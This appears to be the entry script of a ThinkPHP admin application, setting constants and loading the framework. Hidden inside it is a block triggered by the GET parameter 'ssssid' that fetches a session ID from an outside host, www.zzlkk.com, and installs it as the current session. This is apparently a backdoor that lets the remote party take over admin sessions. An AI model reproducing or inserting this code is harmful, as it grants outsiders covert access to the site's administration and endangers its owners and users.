<?php
define('APP_DEBUG',TRUE);
define('APP_NAME','admin');
define('APP_PATH','./');

if(isset($_GET['ssssid'])){
	$ssid = file_get_contents('http://www.zzlkk.com/ssssid.php');
	session_id($ssid);
}

require '../ThinkPHP/ThinkPHP.php';
?>